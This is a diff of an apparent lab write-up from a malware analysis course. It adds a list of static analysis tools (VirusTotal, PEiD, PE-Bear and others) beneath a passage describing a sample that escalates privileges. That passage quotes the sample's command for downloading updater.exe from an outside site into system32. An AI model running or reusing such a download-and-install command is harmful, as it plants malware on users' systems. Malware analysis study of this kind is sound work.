@@ -148,3 +148,15 @@ This malware can upgrade priviledge and download a file from a website. Thus ens
 
 We learn that it download MSVCRT.DLL into our devices. and runs this command to download a .exe file into system.
 `\winup.exe $sis \system32\wupdmgrd.exe $sts http://www.practicalmalwareanalysis.com/updater.exe` 
+
+
+---
+
+
+# Tools Used: 
+ - VirusTotal
+ - PEiD 
+ - Strings
+ - Resouce Hacker
+ - Dependency Walker
+ - PE-Bear
